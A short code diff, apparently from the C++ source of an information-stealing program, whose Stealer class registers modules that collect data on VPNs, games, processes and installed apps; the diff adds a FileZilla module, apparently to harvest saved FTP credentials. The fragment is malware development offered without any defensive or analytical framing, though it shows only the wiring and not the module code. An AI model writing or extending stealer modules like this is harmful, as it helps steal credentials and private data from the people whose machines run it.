@@ -12,6 +12,7 @@
 #include "impl/vpns/VPNs.h"
 #include "impl/games/Games.h"
 #include "impl/InstalledApps.h"
+#include "impl/FileZilla.h"
 #include <thread>
 
 void Stealer::registerModules() {
@@ -24,6 +25,7 @@ void Stealer::registerModules() {
     this->modules.push_back(new Info());
     this->modules.push_back(new Processes());
     this->modules.push_back(new InstalledApps());
+    this->modules.push_back(new FileZilla());
 }
 
 
